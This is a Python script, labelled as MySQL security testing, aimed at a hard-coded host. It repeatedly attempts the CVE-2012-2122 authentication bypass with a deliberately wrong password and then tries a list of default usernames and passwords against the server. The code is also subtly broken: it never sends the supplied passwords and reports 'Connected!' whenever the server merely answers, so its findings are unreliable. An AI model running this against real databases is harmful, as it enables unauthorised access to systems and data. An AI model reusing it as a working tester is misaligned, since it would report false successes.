#!/usr/bin/env python3
import socket
import hashlib
import sys

def test_mysql_connection(host, port, username, password):
    """
    Test MySQL connection with given credentials
    Returns: (success, banner, error_message)
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # Receive server greeting
        greeting = sock.recv(1024)
        
        if len(greeting) > 5:
            protocol_version = greeting[4]
            server_version_end = greeting.index(b'\x00', 5)
            server_version = greeting[5:server_version_end].decode('latin1')
            
            print(f"[+] MySQL Server Version: {server_version}")
            
            # Check for authentication bypass (CVE-2012-2122)
            # Attempt multiple connections with wrong password
            bypass_vulnerable = False
            for attempt in range(300):
                try:
                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_sock.settimeout(2)
                    test_sock.connect((host, port))
                    test_greeting = test_sock.recv(1024)
                    
                    # Send login packet with intentionally wrong password
                    # If one succeeds, CVE-2012-2122 is present
                    login_packet = build_login_packet(username, "wrong_pass_test")
                    test_sock.send(login_packet)
                    response = test_sock.recv(1024)
                    
                    if len(response) > 4:
                        packet_type = response[4]
                        if packet_type == 0x00:  # OK packet
                            print(f"[!] CRITICAL: CVE-2012-2122 Authentication Bypass CONFIRMED!")
                            print(f"[!] Bypassed authentication on attempt {attempt + 1}")
                            test_sock.close()
                            bypass_vulnerable = True
                            break
                    
                    test_sock.close()
                except:
                    pass
            
            if not bypass_vulnerable:
                print(f"[-] CVE-2012-2122 not exploitable")
            
            sock.close()
            return (True, server_version, None)
        
        sock.close()
        return (False, None, "Invalid server response")
        
    except socket.timeout:
        return (False, None, "Connection timeout")
    except Exception as e:
        return (False, None, str(e))

def build_login_packet(username, password):
    """
    Build MySQL authentication packet (simplified)
    """
    # Simplified login packet structure
    capabilities = b'\x0d\xa2\x00\x00'
    max_packet = b'\x00\x00\x00\x01'
    charset = b'\x21'
    reserved = b'\x00' * 23
    
    username_bytes = username.encode('utf-8') + b'\x00'
    password_length = b'\x00'  # No password hash for now
    
    payload = capabilities + max_packet + charset + reserved + username_bytes + password_length
    packet_length = len(payload).to_bytes(3, 'little')
    packet_number = b'\x01'
    
    return packet_length + packet_number + payload

def test_common_credentials(host, port):
    """
    Test common MySQL credentials
    """
    print(f"\n[*] Testing common MySQL credentials on {host}:{port}...")
    
    credentials = [
        ("root", ""),
        ("root", "root"),
        ("root", "password"),
        ("root", "toor"),
        ("root", "admin"),
        ("admin", "admin"),
        ("mysql", "mysql"),
        ("test", "test"),
        ("guest", "guest"),
    ]
    
    for username, password in credentials:
        print(f"[*] Trying {username}:{password if password else '(blank)'}...", end=' ')
        success, banner, error = test_mysql_connection(host, port, username, password)
        if success:
            print(f"Connected! (Server: {banner})")
        else:
            print(f"Failed")
    
    return False

if __name__ == "__main__":
    target_host = "192.168.0.3"
    target_port = 3306
    
    print(f"[*] MySQL Security Testing - {target_host}:{target_port}")
    print("=" * 60)
    
    # Initial connection test
    success, version, error = test_mysql_connection(target_host, target_port, "root", "")
    
    # Test common credentials
    test_common_credentials(target_host, target_port)
    
    print("\n[*] MySQL testing complete")
